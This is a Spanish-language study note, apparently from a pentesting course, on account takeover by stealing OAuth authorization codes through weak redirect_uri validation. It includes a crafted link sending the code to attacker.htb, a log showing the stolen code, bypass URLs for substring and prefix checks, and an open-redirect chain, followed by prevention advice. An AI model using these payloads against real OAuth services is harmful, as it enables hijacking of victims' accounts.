---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Authentication
  - OAuth
Fecha de actualización: 2026-06-23
Nota previa: "[[07 - Introducción a OAuth 2.0]]"
Nota siguiente: "[[09 - Protección CSRF deficiente en OAuth]]"
Area: "[[Authentication Avanzado.base|Authentication Avanzado]]"
---
---

La clase de vulnerabilidad OAuth más grave: <mark style="background: #ADCCFFA6;">la fuga del `authorization code` (o el access token) al atacante por una validación deficiente del `redirect_uri`.</mark> Si el authorization server no verifica bien a dónde redirige, el atacante desvía el código de la víctima a su propio servidor y completa el flujo en su nombre — account takeover total.

# El ataque: desviar el `redirect_uri`

El `redirect_uri` indica a dónde se envía el código tras autorizar. Si se puede manipular, se apunta al servidor del atacante:

```text
http://hubgit.htb/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=http://attacker.htb/callback&state=somevalue
```

El `client_id` se obtiene ejecutando el flujo con la propia cuenta del atacante. Los pasos:

1. El atacante crea ese enlace con `redirect_uri` apuntando a su servidor y se lo entrega a la víctima (phishing).
2. La víctima abre el enlace, **se loguea en hubgit con su cuenta real** y autoriza.
3. Como el `redirect_uri` apunta al atacante, <mark style="background: #FFB86CA6;">el código de autorización de la víctima se envía al servidor del atacante</mark>, que lo lee de sus logs:

```shell-session
$ curl http://attacker.htb/log
/callback?code=Z0FBQUFBQm1...&state=somevalue
```

4. El atacante completa el flujo con ese código (todos los parámetros son conocidos) y obtiene el `access_token` de la víctima. Con él, se hace pasar por ella en el cliente:

```http
GET /client/ HTTP/1.1
Cookie: access_token=eyJ...   ← token de la víctima
```

<mark style="background: #8000E1A6;">La víctima solo hizo clic y se logueó en el servicio legítimo; el atacante acaba con su sesión.</mark>

# Bypass de validación deficiente del `redirect_uri`

En el mundo real el `redirect_uri` suele validarse contra un whitelist. Un valor externo da error `Invalid redirect URI`. Pero la validación parcial se elude. Saca primero el `redirect_uri` legítimo (`http://academy.htb/callback`) completando el flujo con tu cuenta, y prueba bypasses según cómo valide:

| Si valida... | Bypass |
| - | - |
| "contiene/empieza por `academy.htb`" | `http://academy.htb.attacker.htb/callback` (subdominio) |
| el host por prefijo | `http://academy.htb@attacker.htb/callback` (basic auth) |
| "contiene `academy.htb`" | `http://attacker.htb/callback?a=http://academy.htb` (query) |
| el dominio en cualquier parte | `http://attacker.htb/callback#http://academy.htb` (fragmento) |

<mark style="background: #FF5582A6;">El clásico es el `@`</mark>: `http://academy.htb@attacker.htb` — para el parser, `academy.htb` es el *userinfo* y el host real es `attacker.htb`, pero una validación por substring lo da por bueno. Estos bypasses son los mismos que en [[02 - Identificación de SSRF|SSRF]] y open redirect: parsing de URL roto.

> [!warning]+ Open redirect en el cliente: el mismo robo sin tocar el redirect_uri
> Aunque el `redirect_uri` esté bien validado contra el dominio del cliente, si **dentro** de ese dominio existe un [[open redirect]], el atacante encadena: `redirect_uri=http://academy.htb/redirect?url=http://attacker.htb`. El authz server acepta el dominio legítimo, y el open redirect reenvía el código al atacante. Por eso un open redirect "de bajo impacto" se vuelve crítico en presencia de OAuth.

# Prevención

El authorization server debe validar el `redirect_uri` por **igualdad exacta** contra los registrados (no substring, no prefijo), y el cliente no debe tener open redirects. Detalle en [[10 - Vulnerabilidades adicionales y prevención OAuth]].

> [!info]+ Fuentes
> - [PortSwigger — Stealing OAuth access tokens via redirect_uri](https://portswigger.net/web-security/oauth#stealing-oauth-access-tokens)
> - [OAuth Security BCP (RFC 9700)](https://datatracker.ietf.org/doc/html/rfc9700) · [Salt Labs — OAuth account takeover research](https://salt.security/blog)
